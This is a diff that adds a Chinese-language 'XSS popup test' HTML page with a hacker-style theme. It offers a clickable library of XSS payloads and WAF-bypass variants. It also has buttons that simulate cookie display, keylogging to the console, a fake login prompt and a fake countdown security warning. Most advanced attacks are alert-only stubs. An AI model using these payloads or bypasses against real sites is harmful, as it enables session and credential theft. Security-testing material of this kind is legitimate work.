@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS黑页弹窗测试</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #000000, #1a1a1a);
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .hacker-header {
+            background: #000;
+            border-bottom: 2px solid #00ff00;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .hacker-title {
+            font-size: 2.5em;
+            text-shadow: 0 0 10px #00ff00;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #00ff00; }
+            to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
+        }
+        
+        .matrix-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+        }
+        
+        .content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .section {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+        }
+        
+        .section-title {
+            color: #ff0000;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .payload-box {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #00ff00;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .payload-box:hover {
+            background: #222;
+            border-color: #00ff00;
+            transform: translateX(5px);
+        }
+        
+        .button {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            margin: 10px;
+            border-radius: 5px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .button:hover {
+            background: #cc0000;
+            transform: scale(1.05);
+        }
+        
+        .alert-box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #000;
+            border: 3px solid #ff0000;
+            padding: 30px;
+            z-index: 1000;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.7);
+        }
+        
+        .countdown {
+            font-size: 3em;
+            color: #ff0000;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .terminal {
+            background: #000;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            height: 300px;
+            overflow-y: auto;
+        }
+        
+        .terminal-line {
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <!-- 矩阵雨效果 -->
+    <canvas class="matrix-effect" id="matrix"></canvas>
+    
+    <div class="hacker-header">
+        <h1 class="hacker-title">🚨 XSS黑页弹窗测试系统 🚨</h1>
+        <p>安全测试专用 - 请勿用于非法用途</p>
+    </div>
+    
+    <div class="content">
+        <!-- 弹窗测试区 -->
+        <div class="section">
+            <h2 class="section-title">💥 XSS弹窗测试</h2>
+            
+            <button class="button" onclick="testBasicAlert()">基础弹窗测试</button>
+            <button class="button" onclick="testCookieSteal()">Cookie窃取测试</button>
+            <button class="button" onclick="testRedirect()">页面重定向</button>
+            <button class="button" onclick="testKeylogger()">键盘记录测试</button>
+            <button class="button" onclick="testFakeLogin()">伪造登录框</button>
+            <button class="button" onclick="testMultipleAlerts()">多重弹窗攻击</button>
+            <button class="button" onclick="testCountdown()">倒计时弹窗</button>
+            <button class="button" onclick="testFullscreen()">全屏警告</button>
+            
+            <div style="margin-top: 30px;">
+                <h3>📋 XSS Payload库</h3>
+                
+                <div class="payload-box" onclick="copyPayload(this)">
+                    &lt;script&gt;alert('XSS')&lt;/script&gt;
+                </div>
+                
+                <div class="payload-box" onclick="copyPayload(this)">
+                    &lt;img src=x onerror=alert(document.cookie)&gt;
+                </div>
+                
+                <div class="payload-box" onclick="copyPayload(this)">
+                    &lt;svg onload=alert(1)&gt;
+                </div>
+                
+                <div class="payload-box" onclick="copyPayload(this)">
+                    javascript:alert('XSS')
+                </div>
+                
+                <div class="payload-box" onclick="copyPayload(this)">
+                    &lt;body onload=alert('XSS')&gt;
+                </div>
+                
+                <div class="payload-box" onclick="copyPayload(this)">
+                    &lt;iframe src="javascript:alert('XSS')"&gt;
+                </div>
+            </div>
+        </div>
+        
+        <!-- 高级攻击区 -->
+        <div class="section">
+            <h2 class="section-title">🔧 高级XSS攻击</h2>
+            
+            <button class="button" onclick="startBeefHook()">BeEF框架集成</button>
+            <button class="button" onclick="testCSRF()">CSRF攻击测试</button>
+            <button class="button" onclick="testClickjacking()">点击劫持测试</button>
+            <button class="button" onclick="testSessionHijack()">会话劫持</button>
+            <button class="button" onclick="testFormStealing()">表单数据窃取</button>
+            
+            <div style="margin-top: 20px;">
+                <h3>🕵️ 信息收集</h3>
+                <div id="info-collection" class="terminal">
+                    <div class="terminal-line">> 系统信息收集器已就绪</div>
+                    <div class="terminal-line" id="user-agent"></div>
+                    <div class="terminal-line" id="screen-info"></div>
+                    <div class="terminal-line" id="cookie-info"></div>
+                    <div class="terminal-line" id="local-storage"></div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- 防御测试区 -->
+        <div class="section">
+            <h2 class="section-title">🛡️ XSS防御绕过测试</h2>
+            
+            <button class="button" onclick="testEncoding()">编码绕过测试</button>
+            <button class="button" onclick="testUnicode()">Unicode绕过</button>
+            <button class="button" onclick="testCaseVariation()">大小写变异</button>
+            <button class="button" onclick="testCommentBypass()">注释绕过</button>
+            <button class="button" onclick="testEventHandlers()">事件处理器测试</button>
+            
+            <div style="margin-top: 20px;">
+                <h3>🔍 WAF绕过Payload</h3>
+                
+                <div class="payload-box" onclick="copyPayload(this)">
+                    &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
+                </div>
+                
+                <div class="payload-box" onclick="copyPayload(this)">
+                    &lt;img src="x" onerror="&#x61;lert(1)"&gt;
+                </div>
+                
+                <div class="payload-box" onclick="copyPayload(this)">
+                    &lt;svg onload="alert`1`"&gt;
+                </div>
+                
+                <div class="payload-box" onclick="copyPayload(this)">
+                    &lt;marquee onstart=alert(1)&gt;
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // 矩阵雨效果
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = '01';
+        const charArray = chars.split('');
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        
+        for(let x = 0; x < columns; x++) {
+            drops[x] = 1;
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#0F0';
+            ctx.font = fontSize + 'px arial';
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = charArray[Math.floor(Math.random() * charArray.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 35);
+        
+        // 页面加载时收集信息
+        window.onload = function() {
+            collectInfo();
+        };
+        
+        function collectInfo() {
+            document.getElementById('user-agent').textContent = '> User Agent: ' + navigator.userAgent;
+            document.getElementById('screen-info').textContent = '> 屏幕分辨率: ' + screen.width + 'x' + screen.height;
+            document.getElementById('cookie-info').textContent = '> Cookies: ' + document.cookie;
+            document.getElementById('local-storage').textContent = '> Local Storage: ' + JSON.stringify(localStorage);
+        }
+        
+        // XSS测试函数
+        function testBasicAlert() {
+            alert('🚨 XSS测试弹窗 🚨\n这是一个基础XSS弹窗测试');
+        }
+        
+        function testCookieSteal() {
+            const cookies = document.cookie;
+            alert('🍪 Cookie信息:\n' + cookies + '\n\n⚠️ 这些信息可能被发送到攻击者服务器');
+        }
+        
+        function testRedirect() {
+            if(confirm('⚠️ 即将重定向到外部网站，确定继续？')) {
+                window.location.href = 'https://www.example.com';
+            }
+        }
+        
+        function testKeylogger() {
+            alert('⌨️ 键盘记录测试已激活\n尝试在页面上输入一些内容...');
+            
+            document.addEventListener('keydown', function(e) {
+                console.log('按键记录:', e.key);
+            });
+        }
+        
+        function testFakeLogin() {
+            const username = prompt('🔐 请输入用户名:');
+            const password = prompt('🔑 请输入密码:');
+            
+            if(username && password) {
+                alert('⚠️ 警告！您的凭据可能已被窃取\n用户名: ' + username + '\n密码: ' + password);
+            }
+        }
+        
+        function testMultipleAlerts() {
+            for(let i = 1; i <= 5; i++) {
+                setTimeout(() => {
+                    alert(`弹窗 ${i}/5 - XSS测试`);
+                }, i * 1000);
+            }
+        }
+        
+        function testCountdown() {
+            let count = 10;
+            const countdownEl = document.createElement('div');
+            countdownEl.className = 'alert-box';
+            countdownEl.innerHTML = `
+                <h2>⚠️ 系统警告</h2>
+                <p>您的系统检测到安全威胁</p>
+                <div class="countdown">${count}</div>
+                <p>将在倒计时结束后采取安全措施</p>
+                <button onclick="this.parentElement.remove()">取消</button>
+            `;
+            document.body.appendChild(countdownEl);
+            
+            const timer = setInterval(() => {
+                count--;
+                countdownEl.querySelector('.countdown').textContent = count;
+                
+                if(count <= 0) {
+                    clearInterval(timer);
+                    countdownEl.remove();
+                    alert('⏰ 倒计时结束 - 模拟安全措施执行');
+                }
+            }, 1000);
+        }
+        
+        function testFullscreen() {
+            document.documentElement.requestFullscreen().catch(() => {
+                alert('全屏模式被阻止');
+            });
+            
+            setTimeout(() => {
+                alert('🔴 全屏警告弹窗\n这是一个全屏环境下的XSS测试');
+            }, 1000);
+        }
+        
+        function copyPayload(element) {
+            const text = element.textContent.trim();
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✅ Payload已复制到剪贴板:\n' + text);
+            });
+        }
+        
+        // 高级攻击函数
+        function startBeefHook() {
+            alert('🐮 BeEF框架集成测试\n模拟加载BeEF hook脚本...');
+            // 这里可以集成真实的BeEF hook URL
+        }
+        
+        function testCSRF() {
+            alert('🔄 CSRF攻击测试\n模拟发送跨站请求...');
+        }
+        
+        function testClickjacking() {
+            alert('👆 点击劫持测试\n模拟覆盖透明层攻击...');
+        }
+        
+        function testSessionHijack() {
+            alert('🔓 会话劫持测试\n模拟会话令牌窃取...');
+        }
+        
+        function testFormStealing() {
+            alert('📝 表单数据窃取测试\n监控表单提交事件...');
+        }
+        
+        // 防御绕过测试
+        function testEncoding() {
+            alert('🔤 编码绕过测试\n测试各种编码方式的XSS payload');
+        }
+        
+        function testUnicode() {
+            alert('🔣 Unicode绕过测试\n测试Unicode字符的XSS payload');
+        }
+        
+        function testCaseVariation() {
+            alert('🔡 大小写变异测试\n测试大小写混合的XSS payload');
+        }
+        
+        function testCommentBypass() {
+            alert('💬 注释绕过测试\n测试HTML注释的XSS payload');
+        }
+        
+        function testEventHandlers() {
+            alert('🎯 事件处理器测试\n测试各种事件处理器的XSS payload');
+        }
+        
+        // 添加键盘快捷键
+        document.addEventListener('keydown', function(e) {
+            if(e.ctrlKey && e.key === 'x') {
+                e.preventDefault();
+                testBasicAlert();
+            }
+            if(e.ctrlKey && e.key === 'c') {
+                e.preventDefault();
+                testCookieSteal();
+            }
+        });
+    </script>
+</body>
+</html>
